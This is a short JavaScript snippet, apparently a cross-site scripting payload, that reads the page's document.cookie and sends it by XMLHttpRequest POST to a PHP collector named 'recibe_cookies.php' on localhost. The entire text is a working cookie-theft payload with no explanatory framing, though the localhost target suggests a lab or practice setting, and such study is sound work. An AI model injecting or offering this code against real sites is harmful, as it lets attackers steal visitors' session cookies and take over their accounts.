(function() {
    var xhr = new XMLHttpRequest();
    var cookies = document.cookie;
    xhr.open("POST", "http://localhost/recibe_cookies.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("cookies=" + encodeURIComponent(cookies));
})();
